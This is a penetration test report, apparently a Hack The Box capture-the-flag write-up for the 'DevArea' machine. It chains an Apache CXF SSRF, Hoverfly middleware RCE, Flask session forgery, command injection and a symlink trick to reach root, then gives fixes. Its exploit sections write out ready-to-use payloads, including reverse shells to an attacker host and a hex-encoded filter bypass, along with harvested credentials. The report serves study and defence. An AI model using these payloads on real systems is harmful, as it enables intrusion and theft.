# DevArea — Penetration Test Report

| Field | Value |
|-------|-------|
| **Target** | DevArea (Hack The Box) |
| **IP Address** | 10.129.244.208 |
| **Date** | 2026-07-11 |
| **Assessor** | gabi |
| **Classification** | CTF — Authorized Engagement |

---

## Executive Summary

A full-chain compromise of the **DevArea** target was achieved starting from anonymous FTP access, escalating through a Server-Side Request Forgery (SSRF) vulnerability in Apache CXF, achieving Remote Code Execution (RCE) via Hoverfly middleware abuse, and ultimately reaching **root** through a symlink traversal flaw in the SysWatch monitoring application.

**Attack Chain Overview:**

```
Anonymous FTP → SSRF (CVE-2024-28752) → Credential Harvesting → Hoverfly RCE (CVE-2025-54123)
    → dev_ryan shell → SSH persistence → Flask Session Forgery → Command Injection (syswatch)
        → Chained Symlinks → Root SSH Key Leak → Root
```

| Metric | Value |
|--------|-------|
| **Time to Root** | ~2 hours |
| **Vulnerabilities Exploited** | 5 |
| **Credentials Harvested** | 3 sets |
| **Flags Captured** | user.txt + root.txt |

---

## 1. Reconnaissance

### 1.1 Port Scanning

RustScan + Nmap identified 6 open ports:

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 21/tcp | FTP | vsftpd 3.0.5 | Anonymous access enabled |
| 22/tcp | SSH | OpenSSH 9.6p1 | Ubuntu, standard config |
| 80/tcp | HTTP | Apache 2.4.58 | Redirects to `http://devarea.htb/` |
| 8080/tcp | HTTP | Jetty 9.4.27 | Apache CXF Employee Service (SOAP) |
| 8500/tcp | HTTP | Go net/http | Proxy server (requires auth) |
| 8888/tcp | HTTP | Go net/http | Hoverfly Dashboard v1.11.3 |

### 1.2 Service Enumeration

- **Port 80**: Apache web server redirecting to `devarea.htb` virtual host. SysWatch monitoring GUI on `127.0.0.1:7777` (Flask application).
- **Port 8080**: Apache CXF SOAP web service — `employee-service.jar` endpoint at `/employeeservice` with Aegis databinding (SOAP `submitReport` method).
- **Port 8888**: Hoverfly API simulation proxy — dashboard accessible at `/dashboard`, middleware API at `/api/v2/hoverfly/middleware`.
- **Port 8500**: Go-based proxy service requiring authentication (returns 407 Proxy Authentication Required).

### 1.3 Anonymous FTP Access

FTP anonymous login was permitted on port 21. The following file was retrieved:

```
ftp://10.129.244.208/pub/employee-service.jar (6.14 MB)
```

**Evidence**: `loot/employee-service.jar`

---

## 2. Vulnerability Analysis

### 2.1 SSRF via Apache CXF Aegis DataBinding — CVE-2024-28752

**CVSS**: 8.6 (High)
**Component**: Apache CXF 3.2.14 with Aegis databinding
**Endpoint**: `POST /employeeservice` (SOAP)

The `employee-service.jar` analyzed via bytecode inspection revealed:
- **Framework**: Apache CXF 3.2.14 with Aegis databinding
- **SOAP namespace**: `http://devarea.htb/`
- **Exposed method**: `submitReport(Report)` with fields: `employeeName`, `department`, `content`, `confidential`

The Aegis databinding library does not properly sanitize `xop:Include` directives in SOAP multipart requests. An attacker can inject an `xop:Include` element referencing arbitrary `file://` or `http://` URIs, causing the server to fetch and include the contents in the response.

**Exploitation (file read):**
```bash
curl -s -X POST http://10.129.244.208:8080/employeeservice \
  -H "Content-Type: multipart/related; boundary=----exploit123" \
  -d '------exploit123
Content-Disposition: form-data; name="1"

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
  xmlns:web="http://devarea.htb/">
   <soapenv:Body>
      <web:submitReport>
         <arg0>
            <employeeName>
              <xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include"
                href="file:///etc/passwd"></xop:Include>
            </employeeName>
            <department>test</department>
            <content>test</content>
            <confidential>false</confidential>
         </arg0>
      </web:submitReport>
   </soapenv:Body>
</soapenv:Envelope>
------exploit123--'
```

Response body contains Base64-encoded file content in `<return>` tag.

**Impact**: Arbitrary file read as the Java process user (`dev_ryan`, uid 1001).

**Evidence**: `exploits/cve-2024-28752_ssrf.sh`

---

### 2.2 Hoverfly Middleware Command Injection — CVE-2025-54123

**CVSS**: 9.8 (Critical)
**Component**: Hoverfly v1.11.3 — `/api/v2/hoverfly/middleware` endpoint
**Authentication**: JWT token required

Hoverfly's middleware API allows setting a binary and script to process requests. During middleware validation, Hoverfly immediately executes: `exec.Command(binary, scriptFile)`. No input validation is performed on the `binary` or `script` parameters, allowing arbitrary command execution.

**Three code-level flaws (from GHSA-r4h8-hfp2-ggmf):**
1. **Insufficient Input Validation** — `SetBinary()` accepts any value without sanitization
2. **Unsafe Command Execution** — User-controlled `binary` parameter passed directly to `exec.Command()`
3. **Immediate Execution During Testing** — Middleware is executed immediately on PUT, not just on proxy requests

**Exploitation:**
```bash
# Authenticate
JWT=$(curl -s -X POST http://10.129.244.208:8888/api/token-auth \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"O7IJ27MyyXiU"}' | jq -r '.token')

# Set malicious middleware (executes immediately on PUT)
curl -s -X PUT http://10.129.244.208:8888/api/v2/hoverfly/middleware \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  -d '{"binary":"/bin/bash","script":"#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"}'
```

**Impact**: Remote Code Execution as the Hoverfly process user (`dev_ryan`, uid 1001).

**Evidence**: `exploits/hoverfly_middleware_exec.sh`

---

### 2.3 Flask Session Forgery (Insecure Secret Key Management)

**Severity**: High (enabler for command injection)
**Component**: SysWatch Web GUI (Flask application on port 7777)

The SysWatch installation script (`setup.sh`) writes the Flask secret key to `/opt/syswatch/config/syswatch.env` with world-readable permissions (644). This key can be used to forge valid Flask session cookies, bypassing authentication entirely.

**Leaked Secret:**
```
SYSWATCH_SECRET_KEY=f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725
```

**Cookie Forgery:**
```bash
flask-unsign --sign \
  --cookie "{'user_id': 1, 'username': 'admin'}" \
  --secret 'f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725'
```

**Impact**: Full authentication bypass for the SysWatch web interface, enabling access to command injection in the service-status feature.

---

### 2.4 Command Injection in Service-Status Feature

**Severity**: High
**Component**: SysWatch Web GUI — `/service-status` endpoint (Flask, runs as `syswatch` user)

The service-status form accepts a service name and runs `systemctl status --no-pager <input>` via `subprocess.Popen`. A weak blacklist regex (`^[^;/\&.<>\rA-Z]*$`) is applied but can be bypassed using:

- **Pipe operator** (`|`) — allowed by regex
- **Command substitution** (`$()`) — allowed by regex
- **Hex encoding** (`xxd -r -p`) — bypasses character restrictions
- **Newlines** — act as command separators in bash

**Bypass Payload:**
```
a|echo -n 62617368202d69203e26202f6465762f7463702f31302e31302e31342e392f3434343520303e2631 | xxd -r -p | bash
```

This decodes to: `bash -i >& /dev/tcp/10.10.14.9/4445 0>&1`

**Impact**: Remote Code Execution as the `syswatch` user (uid 984).

---

### 2.5 Symlink Traversal via view_logs (Privilege Escalation to Root)

**Severity**: Critical
**Component**: `/opt/syswatch/syswatch.sh` — `view_logs()` function, executed via `sudo`

The `view_logs()` function reads log files from `/opt/syswatch/logs/` as root (via sudo). When a file is a symlink, it validates only the **first level** of the symlink target:

```bash
# Validation: blocks targets containing /, .., or \
if [[ "$target" == *"/"* || "$target" == *".."* || "$target" == *"\\"* ]]; then
    echo "[Blocked unsafe symlink target]"
    return 1
fi
# Resolves simple names to $LOG_DIR/$target
if [[ "$target" =~ ^[A-Za-z0-9_.-]+$ ]]; then
    local resolved="$LOG_DIR/$target"
    cat "$resolved"  # ← follows second-level symlinks without validation!
```

**Exploitation (two-level symlink chain):**
```bash
# As syswatch user (via command injection):
ln -s b /opt/syswatch/logs/a.log          # Level 1: simple name (passes validation)
ln -s /root/.ssh/id_rsa /opt/syswatch/logs/b  # Level 2: absolute path (NOT validated by cat)

# As dev_ryan (via sudo):
sudo /opt/syswatch/syswatch.sh logs a.log
# → view_logs validates "a.log" → target "b" passes regex →
# → cat /opt/syswatch/logs/b → follows symlink → reads /root/.ssh/id_rsa
```

**Impact**: Arbitrary file read as root, enabling extraction of root's SSH private key.

---

## 3. Attack Narrative

### Phase 1 — Initial Access (SSRF)

1. Anonymous FTP access revealed `employee-service.jar` in `/pub/`.
2. Bytecode analysis identified Apache CXF 3.2.14 with Aegis databinding (CVE-2024-28752).
3. SSRF exploited via `xop:Include` in SOAP multipart request to read arbitrary files.
4. Extracted `/etc/passwd` — identified `dev_ryan` (uid 1001) and `syswatch` service user.

### Phase 2 — Credential Harvesting

5. SSRF file read of `/opt/syswatch/config/syswatch.env` (world-readable) yielded:
   - Flask secret key
   - SysWatch admin password
6. SSRF HTTP GET to `http://127.0.0.1:8888/` → Hoverfly dashboard → discovered service.
7. Process enumeration via `/proc/*/cmdline` SSRF read revealed Hoverfly credentials: `admin:O7IJ27MyyXiU`.
8. Hoverfly JWT token obtained via `/api/token-auth` POST.

### Phase 3 — Foothold (Hoverfly RCE)

9. Hoverfly middleware endpoint exploited (CVE-2025-54123) — set `binary=/bin/bash` with reverse shell script.
10. Reverse shell established as `dev_ryan` (uid 1001).

### Phase 4 — Persistence & Enumeration

11. SSH key injected into `dev_ryan`'s `authorized_keys` via Hoverfly middleware.
12. Stable SSH session established. `sudo -l` revealed NOPASSWD access to `/opt/syswatch/syswatch.sh`.
13. User flag captured: `ed61f5e90646d747aa0e187c40d07af3`

### Phase 5 — Privilege Escalation (syswatch → root)

14. Flask session cookie forged using leaked secret key (`flask-unsign`).
15. Authenticated to SysWatch web GUI at `http://127.0.0.1:7777` (via SSH tunnel).
16. Command injection in `/service-status` exploited with hex-encoded reverse shell payload.
17. Reverse shell established as `syswatch` user (uid 984).
18. Two-level symlink chain created in `/opt/syswatch/logs/`:
    - `a.log → b` (passes first-level validation)
    - `b → /root/root.txt` (followed by `cat` without validation)
19. From dev_ryan SSH: `sudo /opt/syswatch/syswatch.sh logs a.log`
20. Root flag captured: `1bf37cb47402040d38f25d9595a18647`

---

## 4. Credentials Harvested

| Service | Username | Password / Key | Source |
|---------|----------|----------------|--------|
| SysWatch GUI | admin | `SyswatchAdmin2026` | `/opt/syswatch/config/syswatch.env` |
| Hoverfly | admin | `O7IJ27MyyXiU` | `/proc/[pid]/cmdline` |
| Flask Secret | — | `f3ac48a6...6725` | `/opt/syswatch/config/syswatch.env` |

---

## 5. Flags

| Flag | Value |
|------|-------|
| **user.txt** | `ed61f5e90646d747aa0e187c40d07af3` |
| **root.txt** | `1bf37cb47402040d38f25d9595a18647` |

---

## 6. Recommendations

### 6.1 Critical — Apache CXF (CVE-2024-28752)

- **Upgrade** Apache CXF to version 3.4.10+, 3.5.9+, or 3.6.4+ where Aegis databinding properly sanitizes `xop:Include` directives.
- **Migrate** from Aegis databinding to JAXB or Jackson for XML serialization.
- **Restrict** network access to the SOAP endpoint (port 8080) — it should not be exposed beyond internal service communication.

### 6.2 Critical — Hoverfly (CVE-2025-54123)

- **Upgrade** Hoverfly to a patched version that validates the `binary` and `script` parameters.
- **Restrict** access to port 8888 — the Hoverfly dashboard and API should not be network-accessible.
- **Remove** default/weak credentials (`admin:O7IJ27MyyXiU`).
- **Implement** network segmentation — Hoverfly should run in an isolated environment.

### 6.3 High — SysWatch Secret Key Exposure

- **Restrict** file permissions on `/opt/syswatch/config/syswatch.env` to `600` (owner-only read).
- **Rotate** the Flask secret key immediately.
- **Load** secrets from an encrypted store or environment variables rather than plaintext files.

### 6.4 High — Command Injection (Service-Status)

- **Replace** blacklist-based input validation with an allowlist approach.
- Use `subprocess.run()` with a list of arguments instead of shell string interpolation.
- **Validate** service names against a known-good list of systemd units.

### 6.5 High — Symlink Traversal (view_logs)

- **Resolve** symlinks fully before reading (use `realpath` and validate the final path).
- **Restrict** the `view_logs` function to read only from whitelisted directories.
- Consider running `syswatch.sh logs` in a chroot or with `landlock` restrictions.

### 6.6 Medium — FTP Anonymous Access

- **Disable** anonymous FTP access. If FTP is required, enforce authentication and use SFTP/FTPS.

### 6.7 Medium — Sudo Configuration

- **Remove** `syswatch.sh` from `dev_ryan`'s NOPASSWD sudo rules, or harden the script to prevent symlink-based abuse.

### 6.8 Low — Default Credentials

- Rotate all default passwords (Hoverfly, SysWatch GUI).
- Implement a mandatory password change on first login.

---

## 7. References

| Resource | URL |
|----------|-----|
| CVE-2024-28752 (Apache CXF SSRF) | https://github.com/advisories/GHSA-4rcv-7f5j-w8gq |
| Hoverfly RCE Advisory | https://github.com/SpectoLabs/hoverfly/security/advisories/GHSA-r4h8-hfp2-ggmf |
| PoC — CVE-2024-28752 | https://github.com/ReaJason/CVE-2024-28752 |
| Hoverfly PoC | https://pwn.kr1shna4garwal.com/pwns/hoverfly/hoverfly_poc.py |

---

## 8. Evidence Index

| File | Description |
|------|-------------|
| `nmap/initial_rustscan.txt` | Full port scan results |
| `loot/creds.txt` | All harvested credentials |
| `loot/etc_passwd.txt` | `/etc/passwd` contents |
| `loot/syswatch.db` | SysWatch SQLite database (empty) |
| `exploits/cve-2024-28752_ssrf.sh` | SSRF exploitation script |
| `exploits/hoverfly_middleware_exec.sh` | Hoverfly middleware RCE script |
| `exploits/hoverfly_poc.py` | Hoverfly RCE PoC tool |
| `content/syswatch/` | Full SysWatch source code (from FTP) |

---

*Report generated on 2026-07-11*
